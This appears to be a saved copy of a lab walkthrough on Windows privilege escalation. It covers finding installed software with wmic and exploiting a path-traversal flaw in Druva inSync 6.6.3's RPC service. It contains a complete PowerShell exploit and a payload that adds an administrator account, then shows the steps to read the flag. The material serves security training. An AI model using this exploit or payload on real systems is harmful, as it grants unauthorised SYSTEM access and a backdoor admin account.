<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Abusing Vulnerable Software</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Abusing Vulnerable Software</h1><br/><br /><h2>Unpatched Software</h2><br />Software installed on the target system can present various privilege  escalation opportunities. As with drivers, organisations and users may  not update them as often as they update the operating system. You can  use the <code>wmic</code> tool to list software installed on the target  system and its versions. The command below will dump information it can  gather on installed software (it might take around a minute to finish):<br /><code>wmic product get name,version,vendor</code>Remember that the <code>wmic product</code> command may not return  all installed programs. Depending on how some of the programs were  installed, they might not get listed here. It is always worth checking  desktop shortcuts, available services or generally any trace that  indicates the existence of additional software that might be vulnerable.<br />Once we have gathered product version information, we can always  search for existing exploits on the installed software online on sites  like <a href="https://www.exploit-db.com/">exploit-db</a>, <a href="https://packetstormsecurity.com/">packet storm</a> or plain old <a href="https://www.google.com/">Google</a>, amongst many others.<br />Using wmic and Google, can you find a known vulnerability on any installed product?<br /><br /><br /><br /><h2>Case Study: Druva inSync 6.6.3</h2><br />The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by <a href="https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/">Matteo Malvica</a>. The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by <a href="https://www.tenable.com/security/research/tra-2020-12">Chris Lyne</a>.<br />The software is vulnerable because it runs an RPC (Remote Procedure  Call) server on port 6064 with SYSTEM privileges, accessible from  localhost only. If you aren&#39;t familiar with RPC, it is simply a  mechanism that allows a given process to expose functions (called  procedures in RPC lingo) over the network so that other machines can  call them remotely.<br />In the case of Druva inSync, one of the procedures exposed  (specifically procedure number 5) on port 6064 allowed anyone to request  the execution of any command. Since the RPC server runs as SYSTEM, any  command gets executed with SYSTEM privileges.<br />The original vulnerability reported on versions 6.5.0 and prior  allowed any command to be run without restrictions. The original idea  behind providing such functionality was to remotely execute some  specific binaries provided with inSync, rather than any command. Still,  no check was made to make sure of that.<br />A patch was issued, where they decided to check that the executed command started with the string <code>C:\ProgramData\Druva\inSync4\</code>,  where the allowed binaries were supposed to be. But then, this proved  insufficient since you could simply make a path traversal attack to  bypass this kind of control. Suppose that you want to execute <code>C:\Windows\System32\cmd.exe</code>, which is not in the allowed path; you could simply ask the server to run <code>C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> and that would bypass the check successfully.<br />To put together a working exploit, we need to understand how to talk  to port 6064. Luckily for us, the protocol in use is straightforward,  and the packets to be sent are depicted in the following diagram:<br /> <a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png"><img src="images/31-1.png" alt="images/31-1.png" /></a><br />The first packet is simply a hello packet that contains a fixed  string. The second packet indicates that we want to execute procedure  number 5, as this is the vulnerable procedure that will execute any  command for us. The last two packets are used to send the length of the  command and the command string to be executed, respectively.<br />Initially published by Matteo Malvica <a href="https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html">here</a>,  the following exploit can be used in your target machine to elevate  privileges and retrieve this task&#39;s flag. For your convenience, here is  the original exploit&#39;s code:<br /><code>$ErrorActionPreference = &quot;Stop&quot;<br /><br />$cmd = &quot;net user pwnd /add&quot;<br /><br />$s = New-Object System.Net.Sockets.Socket(<br />    [System.Net.Sockets.AddressFamily]::InterNetwork,<br />    [System.Net.Sockets.SocketType]::Stream,<br />    [System.Net.Sockets.ProtocolType]::Tcp<br />)<br />$s.Connect(&quot;127.0.0.1&quot;, 6064)<br /><br />$header = [System.Text.Encoding]::UTF8.GetBytes(&quot;inSync PHC RPCW[v0002]&quot;)<br />$rpcType = [System.Text.Encoding]::UTF8.GetBytes(&quot;$([char]0x0005)`0`0`0&quot;)<br />$command = [System.Text.Encoding]::Unicode.GetBytes(&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd&quot;);<br />$length = [System.BitConverter]::GetBytes($command.Length);<br /><br />$s.Send($header)<br />$s.Send($rpcType)<br />$s.Send($length)<br />$s.Send($command)</code>You can pop a Powershell console and paste the exploit directly to  execute it (The exploit is also available in the target machine at <code>C:\tools\Druva_inSync_exploit.txt</code>). Note that the exploit&#39;s default payload, specified in the <code>$cmd</code> variable, will create a user named <code>pwnd</code>  in the system, but won&#39;t assign him administrative privileges, so we  will probably want to change the payload for something more useful. For  this room, we will change the payload to run the following command:<br /><code>net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add</code>This will create user <code>pwnd</code> with a password of <code>SimplePass123</code>  and add it to the administrators&#39; group. If the exploit was successful,  you should be able to run the following command to verify that the user  <code>pwnd</code> exists and is part of the administrators&#39; group:<br />                        Command Prompt        <br />        <code>PS C:\&gt; net user pwnd<br />User name                    pwnd<br />Full Name<br />Account active               Yes<br />[...]<br /><br />Local Group Memberships      *Administrators       *Users<br />Global Group memberships     *None</code><br />            <br /><br />As a last step, you can run a command prompt as administrator:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbd0af143c9a9b31c1acce32fabfdc0f.png"><img src="images/31-2.png" alt="images/31-2.png" /></a><br /><br />When prompted for credentials, use the <code>pwnd</code> account. From the new command prompt, you can<small> retrieve your flag from the Administrator&#39;s desktop with the following command </small><code>type C:\Users\Administrator\Desktop\flag.txt</code><small>.</small><br /></div></body></html>